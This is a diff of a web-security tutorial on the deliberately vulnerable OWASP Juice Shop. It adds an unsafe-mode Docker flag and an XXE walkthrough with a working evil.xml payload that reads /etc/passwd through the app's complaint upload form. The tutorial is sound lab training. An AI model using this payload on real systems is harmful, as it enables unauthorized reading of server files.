@@ -9,7 +9,7 @@ Let's start with one of my favorites, the OWASP Juice Shop.
 1. Open the terminal on your VM and open a new tab with Ctrl-Shift-t. Note you can also close tabs with Ctrl-Shift-w
 2. Paste in the following command with Ctrl-Shift-p:
    ```
-   docker run --rm -d -p 3005:3000 --name=juice bkimminich/juice-shop
+   docker run --rm -d -p 3005:3000 -e NODE_ENV=unsafe --name=juice bkimminich/juice-shop
    ```
 3. Wait a minute or so for the container to download
 4. Once it has finished, run this command:
@@ -22,7 +22,7 @@ You should now have an intentionally vulnerable target that you can do pretty mu
 
 Let's make it even easier to run by adding this command as an alias to your `~/.zshrc` file:
 ```
-echo 'alias juice="docker run --rm -d -p 3005:3000 --name=juice bkimminich/juice-shop"' | tee -a ~/.zshrc
+echo 'alias juice="docker run --rm -d -p 3005:3000 -e NODE_ENV=unsafe --name=juice bkimminich/juice-shop"' | tee -a ~/.zshrc
 ```
 
 To make this alias work, either open a new terminal window or run `source ~/.zshrc`. You can stop the currently running container by running:
@@ -182,11 +182,52 @@ docker run --rm -d  -p 8080:8080 -p 50000:50000 --name=jenkins jenkins
 Additionally, for some awesome and out-of-the-box ideas for XSS, check out [this talk](https://www.youtube.com/watch?v=hKdcDce3FW4).
 
 ### XML External Entities (XXE)
-The last vulnerability I wanted to cover is XML External Entity attacks. This is one of my personal favorites - it is an injection vulnerability that exploits a vulnerable XML parser. [Extensible Markup Language (XML)](https://en.wikipedia.org/wiki/XML#:~:text=Extensible%20Markup%20Language%20(XML)%20is,free%20open%20standards%E2%80%94define%20XML.) is a markup language that's commonly used to transfer data. This vulnerability can allow you to read files on the underlying filesystem, perform SSRF (another vulnerability you should learn about), and in rare cases even get RCE.
+The last vulnerability I wanted to cover is XML External Entity attacks. This is one of my personal favorites - it is an injection vulnerability that exploits a vulnerable XML parser. [Extensible Markup Language (XML)](https://en.wikipedia.org/wiki/XML#:~:text=Extensible%20Markup%20Language%20(XML)%20is,free%20open%20standards%E2%80%94define%20XML.) is a markup language that's commonly used to transfer data. 
 
+Navigate to http://localhost:3005/#/complain. This is another endpoint you can discover through the methodology we discussed earlier in the `Hidden paths in source code` section. 
 
+We are presented with a form which allows us to specify a message and an invoice. Because this form will presumably be read later by someone who may have elevated privileges in the application, this provides us with a number of opportunities to consider. For the message, we could try XSS payloads to see if there's a Blind XSS (go read what that is). Because we can upload a file, we can try uploading a webshell, or we could try uploading some malicious XML. Let's opt to do the latter.
 
+We will create `evil.xml` in the vagrant user's desktop with our malicious payload in it using the following script:
+```
+cat > ~/Desktop/evil.xml << 'EOM'
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ELEMENT foo ANY >
+        <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
 
+<trades>
+    <metadata>
+        <name>Apple Juice</name>
+        <trader>
+            <foo>&xxe;</foo>
+            <name>B. Kimminich</name>
+        </trader>
+        <units>1500</units>
+        <price>106</price>
+        <name>Lemon Juice</name>
+        <trader>
+            <name>B. Kimminich</name>
+        </trader>
+        <units>4500</units>
+        <price>195</price>
+    </metadata>
+</trades>
+EOM
+```
+
+Confirm the file is now in place with `cat ~/Desktop/evil.xml`.
+
+Now go back to the page, enter in a random message, and click **Choose File**. 
+
+Next, click **Desktop** on the left hand side.
+
+There is a dropdown menu on the lower right-hand side of the screen that reads "Custom Files." Click this and select **All Files** to reveal `evil.xml`, which you should select and then click **Open**.
+
+Finally, click **Submit**.
+
+To see the fruit of our labors, go to **Proxy** -> **HTTP History** and find the POST request associated with the file upload. Click the associated response to find the contents of the web server's `/etc/passwd` file.
+
+To make sure it's completely clear: we were able to leverage a file upload form to send the application malicious XML. It executed this malicious XML, which allowed us to specify a file that we wanted to read on the underlying filesystem. This file was then displayed back to us in the error response.
 
 These vulnerabilities are not as common as XSS, but they are still plenty to be found. Back in 2018, I found a few in some Oracle and IBM products. More details can be found at these links:
 
@@ -195,6 +236,8 @@ IBM finding: https://www-01.ibm.com/support/docview.wss?uid=swg22015943
 Oracle findings: https://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html, https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html
 
 #### Why is this vulnerability a concern?
+This vulnerability can allow you to read files on the underlying filesystem, perform SSRF (another vulnerability you should learn about), take down the entire application with a Denial of Service via the [Billion Laughs Attack](https://en.wikipedia.org/wiki/Billion_laughs_attack), and in rare cases even get RCE (only if the application is running PHP and the `expect` module is loaded).
+
 
 ## Intentionally Vulnerable Targets
 If you get through all of the challenges in the juice shop and are looking for more intentionally vulnerable containers, please check out my [containers dotfile](https://github.com/l50/dotfiles/blob/master/containers). There are tons of them in there. 
